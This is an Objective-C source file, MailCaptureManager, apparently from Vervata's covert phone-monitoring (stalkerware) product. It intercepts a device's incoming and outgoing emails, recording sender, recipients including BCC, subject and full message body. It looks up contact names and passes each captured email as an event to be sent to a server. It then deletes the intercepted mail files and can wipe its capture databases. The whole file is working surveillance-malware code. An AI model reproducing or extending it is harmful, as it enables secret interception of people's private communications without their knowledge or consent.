/**
 - Project name :  MailCapture
 - Class name   :  MailCaptureManager
 - Version      :  1.0  
 - Purpose      :  For MailCaptureManager Component
 - Copy right   :  13/12/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "MailCaptureManager.h"
#import "DefStd.h"
#import "SocketIPCReader.h"
#import "FxEmailEvent.h"
#import "FxEvent.h"
#import "FxRecipient.h"
#import "ABContactsManager.h"
#import "FxEventEnums.h"
#import "DateTimeFormat.h"
#import "EventDelegate.h"
#import "DaemonPrivateHome.h"
#import "FMDatabase.h"

@interface MailCaptureManager (PrivateMethods)
// Method for creating system event.
-(void)createAndSendEvent: (NSDictionary *) aMailLog;
//Method for remove mail message;
- (void) removeMail: (NSString *) aPath;
//Method for Format Email
-(NSString *) formatEmail:(NSString *) aEmail;
@end

@implementation MailCaptureManager

+ (void) clearEmailHistory {
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSString *privateSharedHome = [DaemonPrivateHome daemonSharedHome];
	
	NSString *dbPath = [privateSharedHome stringByAppendingString:@"capturedmail.db"];
	if ([fileManager fileExistsAtPath:dbPath]) {
		FMDatabase *db = [FMDatabase databaseWithPath:dbPath];
		[db open];
		[db executeUpdate:@"delete from captured_mail"];
		[db close];
	}
	
	dbPath = [privateSharedHome stringByAppendingString:@"blockedmail.db"];
	if ([fileManager fileExistsAtPath:dbPath]) {
		FMDatabase *db = [FMDatabase databaseWithPath:dbPath];
		[db open];
		[db executeUpdate:@"delete from captured_mail"];
		[db close];
	}
}

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MailCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */

- (id) initWithEventDelegate :(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return self;
}

/**
 - Method name:startMonitoring
 - Purpose: This method is used for start operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startMonitoring {
	if (!mMessagePortIPCReader) {
		mMessagePortIPCReader = [[MessagePortIPCReader alloc] initWithPortName:kEmailMessagePort
													withMessagePortIPCDelegate:self];
		[mMessagePortIPCReader start];
		NSLog (@"Start Monitoring...");
	}
	
}

/**
 - Method name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopMonitoring {
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader stop];
		[mMessagePortIPCReader release];
		mMessagePortIPCReader = nil;
	}
	DLog (@"stopMonitoring...");
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"dataDidReceivedFromMessagePort...");
	if([aRawData length]) {
		NSString *mailPath=[[NSString alloc]initWithData:aRawData encoding:NSUTF8StringEncoding];
		NSData *datafile=[NSData dataWithContentsOfFile:mailPath];
		NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:datafile];
		NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMAILMonitorKey] retain];
		[unarchiver finishDecoding];
		[self createAndSendEvent:dictionary];
		[self removeMail:mailPath];
		[dictionary release];
		[unarchiver release];
		
	}
}

-(void)createAndSendEvent: (NSDictionary *) aMailLog {
	FxEmailEvent *mailEvent=[[FxEmailEvent alloc]init];
	ABContactsManager *contactManager=[[ABContactsManager alloc]init];
	NSArray *headers=[aMailLog objectForKey:kMAILHeaders];
	NSArray *body=[aMailLog objectForKey:kMAILBody];
	NSString *senderAddress=[[headers objectAtIndex:0] objectForKey:kMAILFrom];
	NSString *subject=[[headers objectAtIndex:0] objectForKey:kMAILSubject];
	NSString *message=[[body objectAtIndex:0] objectForKey:kMAILMessage];
	NSString *messageType=[[body objectAtIndex:0] objectForKey:kMAILMessageType];
	NSString *mailType=[aMailLog objectForKey:kMAILType];
	if ([messageType isEqualToString:kMAILBodyTypeHtml]) 
		[mailEvent setHtml:YES];
	else 
		[mailEvent setHtml:NO];
	
	if ([mailType isEqualToString:kMAILTypeIncomming]) 
		[mailEvent setDirection:kEventDirectionIn];
	else 
		[mailEvent setDirection:kEventDirectionOut];
	
	NSArray *to= [[headers objectAtIndex:0] objectForKey:kMAILTo];
	NSArray *cc= [[headers objectAtIndex:0] objectForKey:kMAILCc];
	NSArray *bcc= [[headers objectAtIndex:0] objectForKey:kMAILBCc];
	
	for (NSString *addr in to) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipType:kFxRecipientTO];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	for (NSString *addr in cc) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipType:kFxRecipientCC];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	for (NSString *addr in bcc) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]];
		[recipientInfo setRecipType:kFxRecipientBCC];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	[mailEvent setSenderEmail:senderAddress];
	//[mailEvent setSenderContactName:[contactManager searchContactNameWithEmail:[self formatEmail:senderAddress]]];
	[mailEvent setSenderContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:senderAddress]]];
	[mailEvent setSubject:subject];
	[mailEvent setMessage:message];
	[mailEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[mailEvent setEventType:kEventTypeMail];
	//=============================For Debug=========================================
	
	DLog (@"====================%@  Details=============",mailType);
	//DLog (@"Sender Name:---%@",[contactManager searchContactName:senderAddress]);
	DLog (@"Sender Name:---%@",[contactManager searchFirstNameLastName:senderAddress]);
	DLog (@"Sender Address:---%@",senderAddress);
	DLog (@"To address list:%@",to);
	DLog (@"Cc address list:%@",cc);
	DLog (@"bcc address list:%@",bcc);
	DLog (@"Type:---%@",messageType);
	DLog (@"Subject:---%@",subject);
	DLog (@"Message:---%@",message);
	DLog (@"Mail Type:---%@",mailType);
	DLog (@"===========================================");
	[contactManager release];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@ SEND EMAIL EVENT TO SERVER @@@@@@@@@@@@@@@@@@@@@@@@@")
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:mailEvent];
	}
	[mailEvent release];
	
}


/**
 - Method name:removeMailMessageFromMessagePort
 - Purpose: This method is used to remove Mail message.
 - Argument list and description: aPath (NSString *)
 - Return type and description: No Return
 */


- (void) removeMail: (NSString *) aPath {
	NSFileManager *fileManager=[NSFileManager defaultManager];
	NSError *error=nil;
	if ([fileManager removeItemAtPath:aPath error:&error]) {
		DLog (@"Removed mail message");
	}
	else {
		DLog (@"Error occured while removing mail message")
	}
}

/**
 - Method name:formatEmail
 - Purpose: This method is used to remove Mail message.
 - Argument list and description: aEmail (NSString *)
 - Return type and description: No Return
 */



-(NSString *) formatEmail:(NSString *) aEmail {
	NSString *formatString=@"";
	if ([aEmail length]>0) {
		DLog (@"Email:%@",aEmail);
	  //Initial value of start location
	   NSRange beginRange =NSMakeRange(0, 0);
	   //Initial value of end location 
	   NSRange endRange=NSMakeRange(0, 0);
	   //Find the location of Starting tag '<' 
	   beginRange = [aEmail rangeOfString:@"<"];
	   //Find the location of ending tag '>' 
       endRange = [aEmail rangeOfString:@">"];
	   int rangeDiff=endRange.location-beginRange.location;
	   if (rangeDiff>0) 
		//Successfull! Extract  the string between < > tags
          formatString=[aEmail substringWithRange:NSMakeRange(beginRange.location+1, rangeDiff-1)];
		else 
			formatString=aEmail;	

	}
	return formatString;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader release];
	}
	DLog (@"dealloc...");
	[super dealloc];
}

@end
